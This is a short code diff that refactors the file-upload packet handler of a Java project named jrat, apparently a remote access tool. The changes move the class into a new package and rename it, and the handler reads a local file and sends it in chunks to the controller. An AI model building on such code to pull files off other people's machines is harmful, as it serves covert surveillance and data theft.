@@ -1,10 +1,8 @@
-package jrat.client.packets.incoming;
+package jrat.module.fs.packets.upload;
 
 import jrat.client.Connection;
+import jrat.client.packets.incoming.IncomingPacket;
 import jrat.client.packets.outgoing.OutgoingPacket;
-import jrat.client.packets.outgoing.Packet29ClientUploadPart;
-import jrat.client.packets.outgoing.Packet30BeginClientUpload;
-import jrat.client.packets.outgoing.Packet31CompleteClientUpload;
 import jrat.common.TransferRunnable;
 import jrat.common.io.FileCache;
 import jrat.common.io.TransferData;
@@ -13,7 +11,7 @@ import java.io.File;
 import java.io.FileInputStream;
 
 
-public class Packet21ClientUploadFile implements IncomingPacket {
+public class Packet21Upload implements IncomingPacket {
 
 	@Override
 	public void read(final Connection con) throws Exception {
@@ -47,7 +45,7 @@ public class Packet21ClientUploadFile implements IncomingPacket {
 								return;
 							}
 							
-							OutgoingPacket packet = new Packet29ClientUploadPart(rawFile, chunk, read);
+							OutgoingPacket packet = new Packet29UploadPart(rawFile, chunk, read);
 							con.addToSendQueue(packet);
 						}
 						fileInput.close();
